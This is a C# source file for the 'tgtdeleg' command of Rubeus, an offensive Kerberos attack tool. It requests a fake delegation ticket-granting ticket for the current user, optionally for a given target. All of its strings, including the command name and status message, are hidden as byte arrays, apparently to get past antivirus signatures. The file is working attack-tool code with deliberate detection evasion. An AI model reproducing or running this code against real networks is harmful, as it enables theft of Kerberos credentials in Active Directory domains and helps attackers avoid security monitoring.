using System;
using System.Collections.Generic;


namespace Rubeus.Commands
{
    public class Tgtdeleg : ICommand
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
        public static string CommandName => S(new byte[] { 116, 103, 116, 100, 101, 108, 101, 103 });

        public void Execute(Dictionary<string, string> arguments)
        {
            string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);

            Console.WriteLine(S(new byte[] { 13, 10, 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 82, 101, 113, 117, 101, 115, 116, 32, 70, 97, 107, 101, 32, 68, 101, 108, 101, 103, 97, 116, 105, 111, 110, 32, 84, 71, 84, 32, 40, 99, 117, 114, 114, 101, 110, 116, 32, 117, 115, 101, 114, 41, 13, 10 }));

            if (arguments.ContainsKey(S(new byte[] { 47, 116, 97, 114, 103, 101, 116 })))
            {
                byte[] blah = LSA.RequestFakeDelegTicket(arguments[S(new byte[] { 47, 116, 97, 114, 103, 101, 116 })]);
            }
            else
            {
                byte[] blah = LSA.RequestFakeDelegTicket();
            }
        }
    }
}